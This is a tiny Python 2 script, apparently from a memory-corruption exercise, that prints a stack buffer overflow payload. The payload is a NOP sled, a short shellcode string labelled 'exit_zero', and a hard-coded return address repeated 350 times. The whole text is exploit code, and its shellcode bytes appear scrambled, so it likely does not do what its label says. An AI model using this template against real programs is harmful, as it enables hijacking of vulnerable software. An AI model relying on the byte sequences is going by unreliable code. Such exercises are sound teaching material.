


exit_zero = "\xc0\x31\x24\x04\x89\x80\xcd\x90"
buf_addr = "\xe0\xf2\xff\xbf"
nop = "\x90"
code = exit_zero

print 80*nop + code + buf_addr*350 + '\0'
